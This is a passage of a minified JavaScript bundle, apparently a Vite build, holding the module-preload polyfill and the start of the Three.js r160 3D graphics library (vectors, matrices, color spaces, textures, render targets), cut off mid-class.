(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const r of document.querySelectorAll('link[rel="modulepreload"]'))n(r);new MutationObserver(r=>{for(const s of r)if(s.type==="childList")for(const o of s.addedNodes)o.tagName==="LINK"&&o.rel==="modulepreload"&&n(o)}).observe(document,{childList:!0,subtree:!0});function t(r){const s={};return r.integrity&&(s.integrity=r.integrity),r.referrerPolicy&&(s.referrerPolicy=r.referrerPolicy),r.crossOrigin==="use-credentials"?s.credentials="include":r.crossOrigin==="anonymous"?s.credentials="omit":s.credentials="same-origin",s}function n(r){if(r.ep)return;r.ep=!0;const s=t(r);fetch(r.href,s)}})();/**
 * @license
 * Copyright 2010-2023 Three.js Authors
 * SPDX-License-Identifier: MIT
 */const ss="160",Go=0,Es=1,Ho=2,eo=1,Vo=2,Kt=3,cn=0,Et=1,Ut=2,an=0,Yn=1,ys=2,Ss=3,Ms=4,Wo=5,vn=100,Xo=101,qo=102,bs=103,Ts=104,Yo=200,jo=201,Ko=202,$o=203,Yr=204,jr=205,Zo=206,Qo=207,Jo=208,el=209,tl=210,nl=211,il=212,rl=213,sl=214,al=0,ol=1,ll=2,Yi=3,cl=4,dl=5,ul=6,pl=7,to=0,fl=1,hl=2,on=0,ml=1,_l=2,gl=3,vl=4,xl=5,El=6,no=300,Kn=301,$n=302,Kr=303,$r=304,tr=306,Zr=1e3,Ft=1001,Qr=1002,gt=1003,As=1004,dr=1005,wt=1006,yl=1007,fi=1008,ln=1009,Sl=1010,Ml=1011,as=1012,io=1013,rn=1014,sn=1015,hi=1016,ro=1017,so=1018,yn=1020,bl=1021,kt=1023,Tl=1024,Al=1025,Sn=1026,Zn=1027,Rl=1028,ao=1029,wl=1030,oo=1031,lo=1033,ur=33776,pr=33777,fr=33778,hr=33779,Rs=35840,ws=35841,Cs=35842,Ps=35843,co=36196,Is=37492,Ls=37496,Ds=37808,Ns=37809,Os=37810,Us=37811,Fs=37812,ks=37813,zs=37814,Bs=37815,Gs=37816,Hs=37817,Vs=37818,Ws=37819,Xs=37820,qs=37821,mr=36492,Ys=36494,js=36495,Cl=36283,Ks=36284,$s=36285,Zs=36286,uo=3e3,Mn=3001,Pl=3200,Il=3201,Ll=0,Dl=1,Pt="",lt="srgb",Zt="srgb-linear",os="display-p3",nr="display-p3-linear",ji="linear",je="srgb",Ki="rec709",$i="p3",wn=7680,Qs=519,Nl=512,Ol=513,Ul=514,po=515,Fl=516,kl=517,zl=518,Bl=519,Js=35044,ea="300 es",Jr=1035,$t=2e3,Zi=2001;class Jn{addEventListener(e,t){this._listeners===void 0&&(this._listeners={});const n=this._listeners;n[e]===void 0&&(n[e]=[]),n[e].indexOf(t)===-1&&n[e].push(t)}hasEventListener(e,t){if(this._listeners===void 0)return!1;const n=this._listeners;return n[e]!==void 0&&n[e].indexOf(t)!==-1}removeEventListener(e,t){if(this._listeners===void 0)return;const r=this._listeners[e];if(r!==void 0){const s=r.indexOf(t);s!==-1&&r.splice(s,1)}}dispatchEvent(e){if(this._listeners===void 0)return;const n=this._listeners[e.type];if(n!==void 0){e.target=this;const r=n.slice(0);for(let s=0,o=r.length;s<o;s++)r[s].call(this,e);e.target=null}}}const pt=["00","01","02","03","04","05","06","07","08","09","0a","0b","0c","0d","0e","0f","10","11","12","13","14","15","16","17","18","19","1a","1b","1c","1d","1e","1f","20","21","22","23","24","25","26","27","28","29","2a","2b","2c","2d","2e","2f","30","31","32","33","34","35","36","37","38","39","3a","3b","3c","3d","3e","3f","40","41","42","43","44","45","46","47","48","49","4a","4b","4c","4d","4e","4f","50","51","52","53","54","55","56","57","58","59","5a","5b","5c","5d","5e","5f","60","61","62","63","64","65","66","67","68","69","6a","6b","6c","6d","6e","6f","70","71","72","73","74","75","76","77","78","79","7a","7b","7c","7d","7e","7f","80","81","82","83","84","85","86","87","88","89","8a","8b","8c","8d","8e","8f","90","91","92","93","94","95","96","97","98","99","9a","9b","9c","9d","9e","9f","a0","a1","a2","a3","a4","a5","a6","a7","a8","a9","aa","ab","ac","ad","ae","af","b0","b1","b2","b3","b4","b5","b6","b7","b8","b9","ba","bb","bc","bd","be","bf","c0","c1","c2","c3","c4","c5","c6","c7","c8","c9","ca","cb","cc","cd","ce","cf","d0","d1","d2","d3","d4","d5","d6","d7","d8","d9","da","db","dc","dd","de","df","e0","e1","e2","e3","e4","e5","e6","e7","e8","e9","ea","eb","ec","ed","ee","ef","f0","f1","f2","f3","f4","f5","f6","f7","f8","f9","fa","fb","fc","fd","fe","ff"],_r=Math.PI/180,es=180/Math.PI;function mi(){const i=Math.random()*4294967295|0,e=Math.random()*4294967295|0,t=Math.random()*4294967295|0,n=Math.random()*4294967295|0;return(pt[i&255]+pt[i>>8&255]+pt[i>>16&255]+pt[i>>24&255]+"-"+pt[e&255]+pt[e>>8&255]+"-"+pt[e>>16&15|64]+pt[e>>24&255]+"-"+pt[t&63|128]+pt[t>>8&255]+"-"+pt[t>>16&255]+pt[t>>24&255]+pt[n&255]+pt[n>>8&255]+pt[n>>16&255]+pt[n>>24&255]).toLowerCase()}function xt(i,e,t){return Math.max(e,Math.min(t,i))}function Gl(i,e){return(i%e+e)%e}function gr(i,e,t){return(1-t)*i+t*e}function ta(i){return(i&i-1)===0&&i!==0}function ts(i){return Math.pow(2,Math.floor(Math.log(i)/Math.LN2))}function ii(i,e){switch(e.constructor){case Float32Array:return i;case Uint32Array:return i/4294967295;case Uint16Array:return i/65535;case Uint8Array:return i/255;case Int32Array:return Math.max(i/2147483647,-1);case Int16Array:return Math.max(i/32767,-1);case Int8Array:return Math.max(i/127,-1);default:throw new Error("Invalid component type.")}}function vt(i,e){switch(e.constructor){case Float32Array:return i;case Uint32Array:return Math.round(i*4294967295);case Uint16Array:return Math.round(i*65535);case Uint8Array:return Math.round(i*255);case Int32Array:return Math.round(i*2147483647);case Int16Array:return Math.round(i*32767);case Int8Array:return Math.round(i*127);default:throw new Error("Invalid component type.")}}class Be{constructor(e=0,t=0){Be.prototype.isVector2=!0,this.x=e,this.y=t}get width(){return this.x}set width(e){this.x=e}get height(){return this.y}set height(e){this.y=e}set(e,t){return this.x=e,this.y=t,this}setScalar(e){return this.x=e,this.y=e,this}setX(e){return this.x=e,this}setY(e){return this.y=e,this}setComponent(e,t){switch(e){case 0:this.x=t;break;case 1:this.y=t;break;default:throw new Error("index is out of range: "+e)}return this}getComponent(e){switch(e){case 0:return this.x;case 1:return this.y;default:throw new Error("index is out of range: "+e)}}clone(){return new this.constructor(this.x,this.y)}copy(e){return this.x=e.x,this.y=e.y,this}add(e){return this.x+=e.x,this.y+=e.y,this}addScalar(e){return this.x+=e,this.y+=e,this}addVectors(e,t){return this.x=e.x+t.x,this.y=e.y+t.y,this}addScaledVector(e,t){return this.x+=e.x*t,this.y+=e.y*t,this}sub(e){return this.x-=e.x,this.y-=e.y,this}subScalar(e){return this.x-=e,this.y-=e,this}subVectors(e,t){return this.x=e.x-t.x,this.y=e.y-t.y,this}multiply(e){return this.x*=e.x,this.y*=e.y,this}multiplyScalar(e){return this.x*=e,this.y*=e,this}divide(e){return this.x/=e.x,this.y/=e.y,this}divideScalar(e){return this.multiplyScalar(1/e)}applyMatrix3(e){const t=this.x,n=this.y,r=e.elements;return this.x=r[0]*t+r[3]*n+r[6],this.y=r[1]*t+r[4]*n+r[7],this}min(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this}max(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this}clamp(e,t){return this.x=Math.max(e.x,Math.min(t.x,this.x)),this.y=Math.max(e.y,Math.min(t.y,this.y)),this}clampScalar(e,t){return this.x=Math.max(e,Math.min(t,this.x)),this.y=Math.max(e,Math.min(t,this.y)),this}clampLength(e,t){const n=this.length();return this.divideScalar(n||1).multiplyScalar(Math.max(e,Math.min(t,n)))}floor(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this}ceil(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this}round(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this}roundToZero(){return this.x=Math.trunc(this.x),this.y=Math.trunc(this.y),this}negate(){return this.x=-this.x,this.y=-this.y,this}dot(e){return this.x*e.x+this.y*e.y}cross(e){return this.x*e.y-this.y*e.x}lengthSq(){return this.x*this.x+this.y*this.y}length(){return Math.sqrt(this.x*this.x+this.y*this.y)}manhattanLength(){return Math.abs(this.x)+Math.abs(this.y)}normalize(){return this.divideScalar(this.length()||1)}angle(){return Math.atan2(-this.y,-this.x)+Math.PI}angleTo(e){const t=Math.sqrt(this.lengthSq()*e.lengthSq());if(t===0)return Math.PI/2;const n=this.dot(e)/t;return Math.acos(xt(n,-1,1))}distanceTo(e){return Math.sqrt(this.distanceToSquared(e))}distanceToSquared(e){const t=this.x-e.x,n=this.y-e.y;return t*t+n*n}manhattanDistanceTo(e){return Math.abs(this.x-e.x)+Math.abs(this.y-e.y)}setLength(e){return this.normalize().multiplyScalar(e)}lerp(e,t){return this.x+=(e.x-this.x)*t,this.y+=(e.y-this.y)*t,this}lerpVectors(e,t,n){return this.x=e.x+(t.x-e.x)*n,this.y=e.y+(t.y-e.y)*n,this}equals(e){return e.x===this.x&&e.y===this.y}fromArray(e,t=0){return this.x=e[t],this.y=e[t+1],this}toArray(e=[],t=0){return e[t]=this.x,e[t+1]=this.y,e}fromBufferAttribute(e,t){return this.x=e.getX(t),this.y=e.getY(t),this}rotateAround(e,t){const n=Math.cos(t),r=Math.sin(t),s=this.x-e.x,o=this.y-e.y;return this.x=s*n-o*r+e.x,this.y=s*r+o*n+e.y,this}random(){return this.x=Math.random(),this.y=Math.random(),this}*[Symbol.iterator](){yield this.x,yield this.y}}class ke{constructor(e,t,n,r,s,o,a,l,d){ke.prototype.isMatrix3=!0,this.elements=[1,0,0,0,1,0,0,0,1],e!==void 0&&this.set(e,t,n,r,s,o,a,l,d)}set(e,t,n,r,s,o,a,l,d){const u=this.elements;return u[0]=e,u[1]=r,u[2]=a,u[3]=t,u[4]=s,u[5]=l,u[6]=n,u[7]=o,u[8]=d,this}identity(){return this.set(1,0,0,0,1,0,0,0,1),this}copy(e){const t=this.elements,n=e.elements;return t[0]=n[0],t[1]=n[1],t[2]=n[2],t[3]=n[3],t[4]=n[4],t[5]=n[5],t[6]=n[6],t[7]=n[7],t[8]=n[8],this}extractBasis(e,t,n){return e.setFromMatrix3Column(this,0),t.setFromMatrix3Column(this,1),n.setFromMatrix3Column(this,2),this}setFromMatrix4(e){const t=e.elements;return this.set(t[0],t[4],t[8],t[1],t[5],t[9],t[2],t[6],t[10]),this}multiply(e){return this.multiplyMatrices(this,e)}premultiply(e){return this.multiplyMatrices(e,this)}multiplyMatrices(e,t){const n=e.elements,r=t.elements,s=this.elements,o=n[0],a=n[3],l=n[6],d=n[1],u=n[4],h=n[7],p=n[2],m=n[5],E=n[8],x=r[0],f=r[3],c=r[6],g=r[1],_=r[4],v=r[7],w=r[2],M=r[5],T=r[8];return s[0]=o*x+a*g+l*w,s[3]=o*f+a*_+l*M,s[6]=o*c+a*v+l*T,s[1]=d*x+u*g+h*w,s[4]=d*f+u*_+h*M,s[7]=d*c+u*v+h*T,s[2]=p*x+m*g+E*w,s[5]=p*f+m*_+E*M,s[8]=p*c+m*v+E*T,this}multiplyScalar(e){const t=this.elements;return t[0]*=e,t[3]*=e,t[6]*=e,t[1]*=e,t[4]*=e,t[7]*=e,t[2]*=e,t[5]*=e,t[8]*=e,this}determinant(){const e=this.elements,t=e[0],n=e[1],r=e[2],s=e[3],o=e[4],a=e[5],l=e[6],d=e[7],u=e[8];return t*o*u-t*a*d-n*s*u+n*a*l+r*s*d-r*o*l}invert(){const e=this.elements,t=e[0],n=e[1],r=e[2],s=e[3],o=e[4],a=e[5],l=e[6],d=e[7],u=e[8],h=u*o-a*d,p=a*l-u*s,m=d*s-o*l,E=t*h+n*p+r*m;if(E===0)return this.set(0,0,0,0,0,0,0,0,0);const x=1/E;return e[0]=h*x,e[1]=(r*d-u*n)*x,e[2]=(a*n-r*o)*x,e[3]=p*x,e[4]=(u*t-r*l)*x,e[5]=(r*s-a*t)*x,e[6]=m*x,e[7]=(n*l-d*t)*x,e[8]=(o*t-n*s)*x,this}transpose(){let e;const t=this.elements;return e=t[1],t[1]=t[3],t[3]=e,e=t[2],t[2]=t[6],t[6]=e,e=t[5],t[5]=t[7],t[7]=e,this}getNormalMatrix(e){return this.setFromMatrix4(e).invert().transpose()}transposeIntoArray(e){const t=this.elements;return e[0]=t[0],e[1]=t[3],e[2]=t[6],e[3]=t[1],e[4]=t[4],e[5]=t[7],e[6]=t[2],e[7]=t[5],e[8]=t[8],this}setUvTransform(e,t,n,r,s,o,a){const l=Math.cos(s),d=Math.sin(s);return this.set(n*l,n*d,-n*(l*o+d*a)+o+e,-r*d,r*l,-r*(-d*o+l*a)+a+t,0,0,1),this}scale(e,t){return this.premultiply(vr.makeScale(e,t)),this}rotate(e){return this.premultiply(vr.makeRotation(-e)),this}translate(e,t){return this.premultiply(vr.makeTranslation(e,t)),this}makeTranslation(e,t){return e.isVector2?this.set(1,0,e.x,0,1,e.y,0,0,1):this.set(1,0,e,0,1,t,0,0,1),this}makeRotation(e){const t=Math.cos(e),n=Math.sin(e);return this.set(t,-n,0,n,t,0,0,0,1),this}makeScale(e,t){return this.set(e,0,0,0,t,0,0,0,1),this}equals(e){const t=this.elements,n=e.elements;for(let r=0;r<9;r++)if(t[r]!==n[r])return!1;return!0}fromArray(e,t=0){for(let n=0;n<9;n++)this.elements[n]=e[n+t];return this}toArray(e=[],t=0){const n=this.elements;return e[t]=n[0],e[t+1]=n[1],e[t+2]=n[2],e[t+3]=n[3],e[t+4]=n[4],e[t+5]=n[5],e[t+6]=n[6],e[t+7]=n[7],e[t+8]=n[8],e}clone(){return new this.constructor().fromArray(this.elements)}}const vr=new ke;function fo(i){for(let e=i.length-1;e>=0;--e)if(i[e]>=65535)return!0;return!1}function Qi(i){return document.createElementNS("http://www.w3.org/1999/xhtml",i)}function Hl(){const i=Qi("canvas");return i.style.display="block",i}const na={};function ui(i){i in na||(na[i]=!0,console.warn(i))}const ia=new ke().set(.8224621,.177538,0,.0331941,.9668058,0,.0170827,.0723974,.9105199),ra=new ke().set(1.2249401,-.2249404,0,-.0420569,1.0420571,0,-.0196376,-.0786361,1.0982735),yi={[Zt]:{transfer:ji,primaries:Ki,toReference:i=>i,fromReference:i=>i},[lt]:{transfer:je,primaries:Ki,toReference:i=>i.convertSRGBToLinear(),fromReference:i=>i.convertLinearToSRGB()},[nr]:{transfer:ji,primaries:$i,toReference:i=>i.applyMatrix3(ra),fromReference:i=>i.applyMatrix3(ia)},[os]:{transfer:je,primaries:$i,toReference:i=>i.convertSRGBToLinear().applyMatrix3(ra),fromReference:i=>i.applyMatrix3(ia).convertLinearToSRGB()}},Vl=new Set([Zt,nr]),We={enabled:!0,_workingColorSpace:Zt,get workingColorSpace(){return this._workingColorSpace},set workingColorSpace(i){if(!Vl.has(i))throw new Error(`Unsupported working color space, "${i}".`);this._workingColorSpace=i},convert:function(i,e,t){if(this.enabled===!1||e===t||!e||!t)return i;const n=yi[e].toReference,r=yi[t].fromReference;return r(n(i))},fromWorkingColorSpace:function(i,e){return this.convert(i,this._workingColorSpace,e)},toWorkingColorSpace:function(i,e){return this.convert(i,e,this._workingColorSpace)},getPrimaries:function(i){return yi[i].primaries},getTransfer:function(i){return i===Pt?ji:yi[i].transfer}};function jn(i){return i<.04045?i*.0773993808:Math.pow(i*.9478672986+.0521327014,2.4)}function xr(i){return i<.0031308?i*12.92:1.055*Math.pow(i,.41666)-.055}let Cn;class ho{static getDataURL(e){if(/^data:/i.test(e.src)||typeof HTMLCanvasElement>"u")return e.src;let t;if(e instanceof HTMLCanvasElement)t=e;else{Cn===void 0&&(Cn=Qi("canvas")),Cn.width=e.width,Cn.height=e.height;const n=Cn.getContext("2d");e instanceof ImageData?n.putImageData(e,0,0):n.drawImage(e,0,0,e.width,e.height),t=Cn}return t.width>2048||t.height>2048?(console.warn("THREE.ImageUtils.getDataURL: Image converted to jpg for performance reasons",e),t.toDataURL("image/jpeg",.6)):t.toDataURL("image/png")}static sRGBToLinear(e){if(typeof HTMLImageElement<"u"&&e instanceof HTMLImageElement||typeof HTMLCanvasElement<"u"&&e instanceof HTMLCanvasElement||typeof ImageBitmap<"u"&&e instanceof ImageBitmap){const t=Qi("canvas");t.width=e.width,t.height=e.height;const n=t.getContext("2d");n.drawImage(e,0,0,e.width,e.height);const r=n.getImageData(0,0,e.width,e.height),s=r.data;for(let o=0;o<s.length;o++)s[o]=jn(s[o]/255)*255;return n.putImageData(r,0,0),t}else if(e.data){const t=e.data.slice(0);for(let n=0;n<t.length;n++)t instanceof Uint8Array||t instanceof Uint8ClampedArray?t[n]=Math.floor(jn(t[n]/255)*255):t[n]=jn(t[n]);return{data:t,width:e.width,height:e.height}}else return console.warn("THREE.ImageUtils.sRGBToLinear(): Unsupported image type. No color space conversion applied."),e}}let Wl=0;class mo{constructor(e=null){this.isSource=!0,Object.defineProperty(this,"id",{value:Wl++}),this.uuid=mi(),this.data=e,this.version=0}set needsUpdate(e){e===!0&&this.version++}toJSON(e){const t=e===void 0||typeof e=="string";if(!t&&e.images[this.uuid]!==void 0)return e.images[this.uuid];const n={uuid:this.uuid,url:""},r=this.data;if(r!==null){let s;if(Array.isArray(r)){s=[];for(let o=0,a=r.length;o<a;o++)r[o].isDataTexture?s.push(Er(r[o].image)):s.push(Er(r[o]))}else s=Er(r);n.url=s}return t||(e.images[this.uuid]=n),n}}function Er(i){return typeof HTMLImageElement<"u"&&i instanceof HTMLImageElement||typeof HTMLCanvasElement<"u"&&i instanceof HTMLCanvasElement||typeof ImageBitmap<"u"&&i instanceof ImageBitmap?ho.getDataURL(i):i.data?{data:Array.from(i.data),width:i.width,height:i.height,type:i.data.constructor.name}:(console.warn("THREE.Texture: Unable to serialize Texture."),{})}let Xl=0;class Tt extends Jn{constructor(e=Tt.DEFAULT_IMAGE,t=Tt.DEFAULT_MAPPING,n=Ft,r=Ft,s=wt,o=fi,a=kt,l=ln,d=Tt.DEFAULT_ANISOTROPY,u=Pt){super(),this.isTexture=!0,Object.defineProperty(this,"id",{value:Xl++}),this.uuid=mi(),this.name="",this.source=new mo(e),this.mipmaps=[],this.mapping=t,this.channel=0,this.wrapS=n,this.wrapT=r,this.magFilter=s,this.minFilter=o,this.anisotropy=d,this.format=a,this.internalFormat=null,this.type=l,this.offset=new Be(0,0),this.repeat=new Be(1,1),this.center=new Be(0,0),this.rotation=0,this.matrixAutoUpdate=!0,this.matrix=new ke,this.generateMipmaps=!0,this.premultiplyAlpha=!1,this.flipY=!0,this.unpackAlignment=4,typeof u=="string"?this.colorSpace=u:(ui("THREE.Texture: Property .encoding has been replaced by .colorSpace."),this.colorSpace=u===Mn?lt:Pt),this.userData={},this.version=0,this.onUpdate=null,this.isRenderTargetTexture=!1,this.needsPMREMUpdate=!1}get image(){return this.source.data}set image(e=null){this.source.data=e}updateMatrix(){this.matrix.setUvTransform(this.offset.x,this.offset.y,this.repeat.x,this.repeat.y,this.rotation,this.center.x,this.center.y)}clone(){return new this.constructor().copy(this)}copy(e){return this.name=e.name,this.source=e.source,this.mipmaps=e.mipmaps.slice(0),this.mapping=e.mapping,this.channel=e.channel,this.wrapS=e.wrapS,this.wrapT=e.wrapT,this.magFilter=e.magFilter,this.minFilter=e.minFilter,this.anisotropy=e.anisotropy,this.format=e.format,this.internalFormat=e.internalFormat,this.type=e.type,this.offset.copy(e.offset),this.repeat.copy(e.repeat),this.center.copy(e.center),this.rotation=e.rotation,this.matrixAutoUpdate=e.matrixAutoUpdate,this.matrix.copy(e.matrix),this.generateMipmaps=e.generateMipmaps,this.premultiplyAlpha=e.premultiplyAlpha,this.flipY=e.flipY,this.unpackAlignment=e.unpackAlignment,this.colorSpace=e.colorSpace,this.userData=JSON.parse(JSON.stringify(e.userData)),this.needsUpdate=!0,this}toJSON(e){const t=e===void 0||typeof e=="string";if(!t&&e.textures[this.uuid]!==void 0)return e.textures[this.uuid];const n={metadata:{version:4.6,type:"Texture",generator:"Texture.toJSON"},uuid:this.uuid,name:this.name,image:this.source.toJSON(e).uuid,mapping:this.mapping,channel:this.channel,repeat:[this.repeat.x,this.repeat.y],offset:[this.offset.x,this.offset.y],center:[this.center.x,this.center.y],rotation:this.rotation,wrap:[this.wrapS,this.wrapT],format:this.format,internalFormat:this.internalFormat,type:this.type,colorSpace:this.colorSpace,minFilter:this.minFilter,magFilter:this.magFilter,anisotropy:this.anisotropy,flipY:this.flipY,generateMipmaps:this.generateMipmaps,premultiplyAlpha:this.premultiplyAlpha,unpackAlignment:this.unpackAlignment};return Object.keys(this.userData).length>0&&(n.userData=this.userData),t||(e.textures[this.uuid]=n),n}dispose(){this.dispatchEvent({type:"dispose"})}transformUv(e){if(this.mapping!==no)return e;if(e.applyMatrix3(this.matrix),e.x<0||e.x>1)switch(this.wrapS){case Zr:e.x=e.x-Math.floor(e.x);break;case Ft:e.x=e.x<0?0:1;break;case Qr:Math.abs(Math.floor(e.x)%2)===1?e.x=Math.ceil(e.x)-e.x:e.x=e.x-Math.floor(e.x);break}if(e.y<0||e.y>1)switch(this.wrapT){case Zr:e.y=e.y-Math.floor(e.y);break;case Ft:e.y=e.y<0?0:1;break;case Qr:Math.abs(Math.floor(e.y)%2)===1?e.y=Math.ceil(e.y)-e.y:e.y=e.y-Math.floor(e.y);break}return this.flipY&&(e.y=1-e.y),e}set needsUpdate(e){e===!0&&(this.version++,this.source.needsUpdate=!0)}get encoding(){return ui("THREE.Texture: Property .encoding has been replaced by .colorSpace."),this.colorSpace===lt?Mn:uo}set encoding(e){ui("THREE.Texture: Property .encoding has been replaced by .colorSpace."),this.colorSpace=e===Mn?lt:Pt}}Tt.DEFAULT_IMAGE=null;Tt.DEFAULT_MAPPING=no;Tt.DEFAULT_ANISOTROPY=1;class ct{constructor(e=0,t=0,n=0,r=1){ct.prototype.isVector4=!0,this.x=e,this.y=t,this.z=n,this.w=r}get width(){return this.z}set width(e){this.z=e}get height(){return this.w}set height(e){this.w=e}set(e,t,n,r){return this.x=e,this.y=t,this.z=n,this.w=r,this}setScalar(e){return this.x=e,this.y=e,this.z=e,this.w=e,this}setX(e){return this.x=e,this}setY(e){return this.y=e,this}setZ(e){return this.z=e,this}setW(e){return this.w=e,this}setComponent(e,t){switch(e){case 0:this.x=t;break;case 1:this.y=t;break;case 2:this.z=t;break;case 3:this.w=t;break;default:throw new Error("index is out of range: "+e)}return this}getComponent(e){switch(e){case 0:return this.x;case 1:return this.y;case 2:return this.z;case 3:return this.w;default:throw new Error("index is out of range: "+e)}}clone(){return new this.constructor(this.x,this.y,this.z,this.w)}copy(e){return this.x=e.x,this.y=e.y,this.z=e.z,this.w=e.w!==void 0?e.w:1,this}add(e){return this.x+=e.x,this.y+=e.y,this.z+=e.z,this.w+=e.w,this}addScalar(e){return this.x+=e,this.y+=e,this.z+=e,this.w+=e,this}addVectors(e,t){return this.x=e.x+t.x,this.y=e.y+t.y,this.z=e.z+t.z,this.w=e.w+t.w,this}addScaledVector(e,t){return this.x+=e.x*t,this.y+=e.y*t,this.z+=e.z*t,this.w+=e.w*t,this}sub(e){return this.x-=e.x,this.y-=e.y,this.z-=e.z,this.w-=e.w,this}subScalar(e){return this.x-=e,this.y-=e,this.z-=e,this.w-=e,this}subVectors(e,t){return this.x=e.x-t.x,this.y=e.y-t.y,this.z=e.z-t.z,this.w=e.w-t.w,this}multiply(e){return this.x*=e.x,this.y*=e.y,this.z*=e.z,this.w*=e.w,this}multiplyScalar(e){return this.x*=e,this.y*=e,this.z*=e,this.w*=e,this}applyMatrix4(e){const t=this.x,n=this.y,r=this.z,s=this.w,o=e.elements;return this.x=o[0]*t+o[4]*n+o[8]*r+o[12]*s,this.y=o[1]*t+o[5]*n+o[9]*r+o[13]*s,this.z=o[2]*t+o[6]*n+o[10]*r+o[14]*s,this.w=o[3]*t+o[7]*n+o[11]*r+o[15]*s,this}divideScalar(e){return this.multiplyScalar(1/e)}setAxisAngleFromQuaternion(e){this.w=2*Math.acos(e.w);const t=Math.sqrt(1-e.w*e.w);return t<1e-4?(this.x=1,this.y=0,this.z=0):(this.x=e.x/t,this.y=e.y/t,this.z=e.z/t),this}setAxisAngleFromRotationMatrix(e){let t,n,r,s;const l=e.elements,d=l[0],u=l[4],h=l[8],p=l[1],m=l[5],E=l[9],x=l[2],f=l[6],c=l[10];if(Math.abs(u-p)<.01&&Math.abs(h-x)<.01&&Math.abs(E-f)<.01){if(Math.abs(u+p)<.1&&Math.abs(h+x)<.1&&Math.abs(E+f)<.1&&Math.abs(d+m+c-3)<.1)return this.set(1,0,0,0),this;t=Math.PI;const _=(d+1)/2,v=(m+1)/2,w=(c+1)/2,M=(u+p)/4,T=(h+x)/4,D=(E+f)/4;return _>v&&_>w?_<.01?(n=0,r=.707106781,s=.707106781):(n=Math.sqrt(_),r=M/n,s=T/n):v>w?v<.01?(n=.707106781,r=0,s=.707106781):(r=Math.sqrt(v),n=M/r,s=D/r):w<.01?(n=.707106781,r=.707106781,s=0):(s=Math.sqrt(w),n=T/s,r=D/s),this.set(n,r,s,t),this}let g=Math.sqrt((f-E)*(f-E)+(h-x)*(h-x)+(p-u)*(p-u));return Math.abs(g)<.001&&(g=1),this.x=(f-E)/g,this.y=(h-x)/g,this.z=(p-u)/g,this.w=Math.acos((d+m+c-1)/2),this}min(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this.z=Math.min(this.z,e.z),this.w=Math.min(this.w,e.w),this}max(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this.z=Math.max(this.z,e.z),this.w=Math.max(this.w,e.w),this}clamp(e,t){return this.x=Math.max(e.x,Math.min(t.x,this.x)),this.y=Math.max(e.y,Math.min(t.y,this.y)),this.z=Math.max(e.z,Math.min(t.z,this.z)),this.w=Math.max(e.w,Math.min(t.w,this.w)),this}clampScalar(e,t){return this.x=Math.max(e,Math.min(t,this.x)),this.y=Math.max(e,Math.min(t,this.y)),this.z=Math.max(e,Math.min(t,this.z)),this.w=Math.max(e,Math.min(t,this.w)),this}clampLength(e,t){const n=this.length();return this.divideScalar(n||1).multiplyScalar(Math.max(e,Math.min(t,n)))}floor(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this.w=Math.floor(this.w),this}ceil(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this.w=Math.ceil(this.w),this}round(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this.w=Math.round(this.w),this}roundToZero(){return this.x=Math.trunc(this.x),this.y=Math.trunc(this.y),this.z=Math.trunc(this.z),this.w=Math.trunc(this.w),this}negate(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this.w=-this.w,this}dot(e){return this.x*e.x+this.y*e.y+this.z*e.z+this.w*e.w}lengthSq(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w}length(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)}manhattanLength(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)}normalize(){return this.divideScalar(this.length()||1)}setLength(e){return this.normalize().multiplyScalar(e)}lerp(e,t){return this.x+=(e.x-this.x)*t,this.y+=(e.y-this.y)*t,this.z+=(e.z-this.z)*t,this.w+=(e.w-this.w)*t,this}lerpVectors(e,t,n){return this.x=e.x+(t.x-e.x)*n,this.y=e.y+(t.y-e.y)*n,this.z=e.z+(t.z-e.z)*n,this.w=e.w+(t.w-e.w)*n,this}equals(e){return e.x===this.x&&e.y===this.y&&e.z===this.z&&e.w===this.w}fromArray(e,t=0){return this.x=e[t],this.y=e[t+1],this.z=e[t+2],this.w=e[t+3],this}toArray(e=[],t=0){return e[t]=this.x,e[t+1]=this.y,e[t+2]=this.z,e[t+3]=this.w,e}fromBufferAttribute(e,t){return this.x=e.getX(t),this.y=e.getY(t),this.z=e.getZ(t),this.w=e.getW(t),this}random(){return this.x=Math.random(),this.y=Math.random(),this.z=Math.random(),this.w=Math.random(),this}*[Symbol.iterator](){yield this.x,yield this.y,yield this.z,yield this.w}}class ql extends Jn{constructor(e=1,t=1,n={}){super(),this.isRenderTarget=!0,this.width=e,this.height=t,this.depth=1,this.scissor=new ct(0,0,e,t),this.scissorTest=!1,this.viewport=new ct(0,0,e,t);const r={width:e,height:t,depth:1};n.encoding!==void 0&&(ui("THREE.WebGLRenderTarget: option.encoding has been replaced by option.colorSpace."),n.colorSpace=n.encoding===Mn?lt:Pt),n=Object.assign({generateMipmaps:!1,internalFormat:null,minFilter:wt,depthBuffer:!0,stencilBuffer:!1,depthTexture:null,samples:0},n),this.texture=new Tt(r,n.mapping,n.wrapS,n.wrapT,n.magFilter,n.minFilter,n.format,n.type,n.anisotropy,n.colorSpace),this.texture.isRenderTargetTexture=!0,this.texture.flipY=!1,this.texture.generateMipmaps=n.generateMipmaps,this.texture.internalFormat=n.internalFormat,this.depthBuffer=n.depthBuffer,this.stencilBuffer=n.stencilBuffer,this.depthTexture=n.depthTexture,this.samples=n.samples}setSize(e,t,n=1){(this.width!==e||this.height!==t||this.depth!==n)&&(this.width=e,this.height=t,this.depth=n,this.texture.image.width=e,this.texture.image.height=t,this.texture.image.depth=n,this.dispose()),this.viewport.set(0,0,e,t),this.scissor.set(0,0,e,t)}clone(){return new 